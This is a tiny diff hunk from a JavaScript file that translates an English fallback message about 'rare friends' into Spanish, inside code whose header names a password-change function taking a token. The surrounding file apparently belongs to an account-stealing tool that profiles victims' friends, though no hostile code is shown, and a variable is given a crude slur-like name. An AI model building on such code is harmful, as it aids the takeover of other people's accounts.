@@ -738,7 +738,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 									}
 								}
 								if (gay == "") {
-									gay = "No Rare Friends"
+									gay = "No tiene amigos con insignias raras"
 								}
 								return gay
 							}
